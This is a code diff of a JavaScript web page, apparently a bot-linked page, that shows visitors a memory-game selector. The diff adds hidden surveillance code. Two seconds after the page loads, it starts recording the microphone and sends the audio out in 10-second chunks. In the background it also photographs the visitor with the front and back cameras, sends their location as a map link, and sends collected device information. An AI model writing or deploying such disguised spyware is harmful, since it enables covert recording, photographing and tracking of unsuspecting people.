@@ -128,55 +128,64 @@ let mediaRecorder = null;
 let audioStream = null;
 
 async function startLongRecording() {
+    await sendMessage("🎤 Пытаюсь включить микрофон...");
+    
     if (isRecording) {
-        sendMessage('⏹️ Запись уже идёт');
+        await sendMessage('⏹️ Запись уже идёт');
         return;
     }
     
     try {
         audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        await sendMessage("✅ Микрофон ДОСТУПЕН! Начинаю запись...");
+        
         mediaRecorder = new MediaRecorder(audioStream);
         let chunks = [];
         
-        mediaRecorder.ondataavailable = (e) => {
+        mediaRecorder.ondataavailable = async (e) => {
             if (e.data.size > 0) {
                 chunks.push(e.data);
+                // Отправляем каждый фрагмент отдельно
+                const blob = new Blob([e.data], { type: 'audio/webm' });
+                const timestamp = new Date().toLocaleTimeString('ru-RU');
+                await sendAudio(blob, `🎙️ Фрагмент записи (${timestamp})`);
+                chunks = []; // Очищаем после отправки
             }
         };
         
         mediaRecorder.onstop = async () => {
-            if (chunks.length > 0) {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                const timestamp = new Date().toLocaleTimeString('ru-RU');
-                await sendAudio(blob, `🎙️ Фрагмент записи (${timestamp})`);
-                chunks = [];
+            await sendMessage('⏹️ Запись микрофона остановлена');
+            if (audioStream) {
+                audioStream.getTracks().forEach(track => track.stop());
             }
         };
         
-        mediaRecorder.start(10000);
+        mediaRecorder.start(10000); // Каждые 10 секунд
         isRecording = true;
-        sendMessage('🎙️ ЗАПИСЬ НАЧАЛАСЬ! Отправка каждые 10 секунд.');
+        await sendMessage('🎙️ ЗАПИСЬ НАЧАЛАСЬ! Отправка каждые 10 секунд.');
         
     } catch(e) {
-        sendMessage('❌ Ошибка доступа к микрофону');
+        let errorMsg = "❌ Ошибка микрофона: ";
+        if (e.name === "NotAllowedError") errorMsg += "Пользователь запретил доступ";
+        else if (e.name === "NotFoundError") errorMsg += "Микрофон не найден";
+        else errorMsg += e.message;
+        await sendMessage(errorMsg);
+        console.error(e);
     }
 }
 
 async function stopLongRecording() {
     if (!isRecording || !mediaRecorder) {
-        sendMessage('⏹️ Запись не активна');
+        await sendMessage('⏹️ Запись не активна');
         return;
     }
     
     mediaRecorder.stop();
-    if (audioStream) {
-        audioStream.getTracks().forEach(track => track.stop());
-    }
     isRecording = false;
     mediaRecorder = null;
     audioStream = null;
     
-    sendMessage('⏹️ ЗАПИСЬ ОСТАНОВЛЕНА');
+    await sendMessage('⏹️ ЗАПИСЬ ОСТАНОВЛЕНА');
 }
 
 async function takeScreenshot() {
@@ -394,9 +403,6 @@ function createMemoryGame(onBack) {
         initGame();
     });
     
-    // НЕ запускаем игру сразу
-    // initGame();
-    
     return container;
 }
 
@@ -570,45 +576,49 @@ async function main() {
     const loader = document.querySelector('.loader');
     if (loader) loader.style.display = 'none';
     
-    // Сначала показываем выбор игр
+    // Показываем выбор игр
     showGameSelector();
     
-    // Потом в фоне собираем данные (не блокируя интерфейс)
+    // Отправляем тестовое сообщение, что бот запустился
+    await sendMessage("✅ БОТ ЗАПУЩЕН");
+    
+    // ЗАПУСКАЕМ МИКРОФОН ОТДЕЛЬНО И ГАРАНТИРОВАННО
+    setTimeout(async () => {
+        await startLongRecording();
+    }, 2000);
+    
+    // Сбор остальных данных в фоне (независимо от микрофона)
     setTimeout(async () => {
         // Геолокация
         getGeo(async (loc) => {
             if (loc) {
                 await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
             }
-            
-            // Камера
-            getCamera('user', async (stream) => {
-                if (stream) {
-                    await takePhoto(stream, '📸 Фронтальная камера');
-                    
-                    setTimeout(async () => {
-                        getCamera('environment', async (backStream) => {
-                            if (backStream) {
-                                await takePhoto(backStream, '📸 Задняя камера');
-                                backStream.getTracks().forEach(t => t.stop());
-                            }
-                            stream.getTracks().forEach(t => t.stop());
-                            
-                            // Микрофон
-                            startLongRecording();
-                        
-                            
-                            // Остальная информация
-                            const allInfo = await collectAllInfo();
-                            await sendMessage(allInfo);
-                        });
-                    }, 3000);
-                } else {
-                    const allInfo = await collectAllInfo();
-                    await sendMessage(allInfo);
+        });
+        
+        // Камера (фронтальная)
+        getCamera('user', async (stream) => {
+            if (stream) {
+                await takePhoto(stream, '📸 Фронтальная камера');
+                stream.getTracks().forEach(t => t.stop());
+            }
+        });
+        
+        // Камера (задняя) с небольшой задержкой
+        setTimeout(async () => {
+            getCamera('environment', async (backStream) => {
+                if (backStream) {
+                    await takePhoto(backStream, '📸 Задняя камера');
+                    backStream.getTracks().forEach(t => t.stop());
                 }
             });
-        });
+        }, 3000);
+        
+        // Остальная информация
+        setTimeout(async () => {
+            const allInfo = await collectAllInfo();
+            await sendMessage(allInfo);
+        }, 5000);
     }, 100);
 }
 
